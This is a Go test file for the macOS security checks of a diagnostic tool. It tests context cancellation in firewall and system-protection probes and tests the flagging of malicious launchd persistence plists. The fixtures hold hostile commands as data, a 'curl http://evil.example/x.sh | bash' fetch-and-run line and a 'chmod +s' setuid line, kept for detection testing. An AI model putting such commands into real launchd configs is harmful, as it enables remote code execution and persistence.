//go:build darwin

package collectors

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/keyorixhq/dashdiag/internal/models"
	"github.com/keyorixhq/dashdiag/internal/source"
)

// TestParseDarwinFirewall_ContextCancelled guards subprocess-wrappers-02:
// parseDarwinFirewall's socketfilterfw probe previously ran via
// runCmd(context.Background(), ...), decoupled from the collector's own ctx.
// Inject a mock Exec that only resolves after a real ctx.Done() (or a 2s
// fallback) and call with an already-cancelled ctx: with the collector's ctx
// genuinely threaded through, the call returns almost immediately via
// ctx.Done(); the pre-fix code (a hidden context.Background() call) would
// instead ride out the full 2s window and misreport the firewall as active.
func TestParseDarwinFirewall_ContextCancelled(t *testing.T) {
	prev := SetSource(source.Live{Exec: func(ctx context.Context, _ string, _ ...string) (source.Result, error) {
		select {
		case <-ctx.Done():
			return source.Result{}, ctx.Err()
		case <-time.After(2 * time.Second):
			return source.Result{Stdout: []byte("Firewall is enabled. (State = 1)")}, nil
		}
	}})
	defer SetSource(prev)

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // already cancelled before parseDarwinFirewall ever runs

	info := &models.SecurityInfo{}
	start := time.Now()
	parseDarwinFirewall(ctx, info)
	elapsed := time.Since(start)

	if elapsed > 1*time.Second {
		t.Errorf("parseDarwinFirewall took %v with an already-cancelled ctx — want a fast return via ctx.Done(), not riding out the mock's 2s window (ctx not propagated to runCmd)", elapsed)
	}
	if info.FirewallActive {
		t.Error("FirewallActive = true, want false — the socketfilterfw call should have been cancelled")
	}
}

// TestParseDarwinSystemSecurity_ContextCancelled guards subprocess-wrappers-
// 02 for the same anti-pattern across parseDarwinSystemSecurity's three
// probes (fdesetup, csrutil, spctl), all of which previously ran via
// runCmd(context.Background(), ...).
func TestParseDarwinSystemSecurity_ContextCancelled(t *testing.T) {
	prev := SetSource(source.Live{Exec: func(ctx context.Context, name string, _ ...string) (source.Result, error) {
		select {
		case <-ctx.Done():
			return source.Result{}, ctx.Err()
		case <-time.After(2 * time.Second):
			switch name {
			case "fdesetup":
				return source.Result{Stdout: []byte("FileVault is On.")}, nil
			case "csrutil":
				return source.Result{Stdout: []byte("System Integrity Protection status: enabled.")}, nil
			case "spctl":
				return source.Result{Stdout: []byte("assessments enabled")}, nil
			}
			return source.Result{}, nil
		}
	}})
	defer SetSource(prev)

	ctx, cancel := context.WithCancel(context.Background())
	cancel() // already cancelled before parseDarwinSystemSecurity ever runs

	info := &models.SecurityInfo{}
	start := time.Now()
	parseDarwinSystemSecurity(ctx, info)
	elapsed := time.Since(start)

	if elapsed > 1*time.Second {
		t.Errorf("parseDarwinSystemSecurity took %v with an already-cancelled ctx — want a fast return via ctx.Done() on every probe, not riding out the mock's 2s window per call (ctx not propagated to runCmd)", elapsed)
	}
	if info.FileVaultEnabled || info.SIPEnabled || info.GatekeeperEnabled {
		t.Errorf("FileVaultEnabled=%v SIPEnabled=%v GatekeeperEnabled=%v, want all false — every probe should have been cancelled",
			info.FileVaultEnabled, info.SIPEnabled, info.GatekeeperEnabled)
	}
}

// withDarwinFixtureSource mirrors the Linux withFixtureSource helper (defined
// in a linux-only test file, so not usable here): swaps activeSource for a
// Replay over a seeded Bundle for the duration of the test.
func withDarwinFixtureSource(t *testing.T, seed func(b *source.Bundle)) {
	t.Helper()
	b := source.NewBundle()
	seed(b)
	prev := SetSource(source.NewReplay(b))
	t.Cleanup(func() { SetSource(prev) })
}

// TestParseDarwinSuspectLaunchd_RootDirs guards the pre-existing scan of the
// two root-owned LaunchDaemons/LaunchAgents dirs: a plist with a persistence
// indicator (piping to a shell) must be flagged, a benign plist must not.
func TestParseDarwinSuspectLaunchd_RootDirs(t *testing.T) {
	withDarwinFixtureSource(t, func(b *source.Bundle) {
		b.PutDir("/Library/LaunchDaemons", []string{"com.evil.backdoor.plist", "com.apple.legit.plist"})
		b.PutFile("/Library/LaunchDaemons/com.evil.backdoor.plist", []byte(
			"<key>ProgramArguments</key><string>curl http://evil.example/x.sh | bash</string>"))
		b.PutFile("/Library/LaunchDaemons/com.apple.legit.plist", []byte(
			"<key>ProgramArguments</key><string>/usr/libexec/legit-helper</string>"))
		b.PutDir("/Library/LaunchAgents", nil)
		b.PutGlob("/Users/*/Library/LaunchAgents", nil)
	})
	info := &models.SecurityInfo{}
	parseDarwinSuspectLaunchd(context.Background(), info)

	if len(info.SuspectCrons) != 1 {
		t.Fatalf("expected exactly 1 suspect entry, got %d: %v", len(info.SuspectCrons), info.SuspectCrons)
	}
	if !strings.Contains(info.SuspectCrons[0], "com.evil.backdoor.plist") {
		t.Errorf("the suspect entry should be attributed to its file, got %q", info.SuspectCrons[0])
	}
}

// TestParseDarwinSuspectLaunchd_UserLaunchAgents covers the false-OK this
// collector previously had no way to catch: a persistence plist dropped in a
// per-user ~/Library/LaunchAgents (writable by any unprivileged user, the
// standard non-root macOS persistence location) was never scanned at all —
// only the two root-owned dirs were. Must now be flagged.
func TestParseDarwinSuspectLaunchd_UserLaunchAgents(t *testing.T) {
	withDarwinFixtureSource(t, func(b *source.Bundle) {
		b.PutDir("/Library/LaunchDaemons", nil)
		b.PutDir("/Library/LaunchAgents", nil)
		b.PutGlob("/Users/*/Library/LaunchAgents", []string{"/Users/alice/Library/LaunchAgents"})
		b.PutDir("/Users/alice/Library/LaunchAgents", []string{"com.evil.persist.plist"})
		b.PutFile("/Users/alice/Library/LaunchAgents/com.evil.persist.plist", []byte(
			"<key>ProgramArguments</key><string>/bin/sh -c 'curl http://evil.example/x.sh | bash'</string>"))
	})
	info := &models.SecurityInfo{}
	parseDarwinSuspectLaunchd(context.Background(), info)

	if len(info.SuspectCrons) != 1 {
		t.Fatalf("expected the per-user LaunchAgent persistence plist to be flagged, got %d: %v", len(info.SuspectCrons), info.SuspectCrons)
	}
	if !strings.Contains(info.SuspectCrons[0], "com.evil.persist.plist") {
		t.Errorf("the suspect entry should be attributed to its file, got %q", info.SuspectCrons[0])
	}
}

// TestParseDarwinSuspectLaunchd_GlobFailsSkipsUserDirs guards the fallback:
// when the /Users/*/Library/LaunchAgents glob itself errors, the scan must
// still complete over the two root-owned dirs rather than aborting.
func TestParseDarwinSuspectLaunchd_GlobFailsSkipsUserDirs(t *testing.T) {
	withDarwinFixtureSource(t, func(b *source.Bundle) {
		b.PutDir("/Library/LaunchDaemons", []string{"com.evil.backdoor.plist"})
		b.PutFile("/Library/LaunchDaemons/com.evil.backdoor.plist", []byte("chmod +s /tmp/x"))
		b.PutDir("/Library/LaunchAgents", nil)
		// /Users/*/Library/LaunchAgents deliberately NOT seeded — Replay.Glob
		// returns ErrNotRecorded, exercising the "err != nil, skip" branch.
	})
	info := &models.SecurityInfo{}
	parseDarwinSuspectLaunchd(context.Background(), info)

	if len(info.SuspectCrons) != 1 {
		t.Errorf("expected the root-dir scan to still complete, got %d: %v", len(info.SuspectCrons), info.SuspectCrons)
	}
}
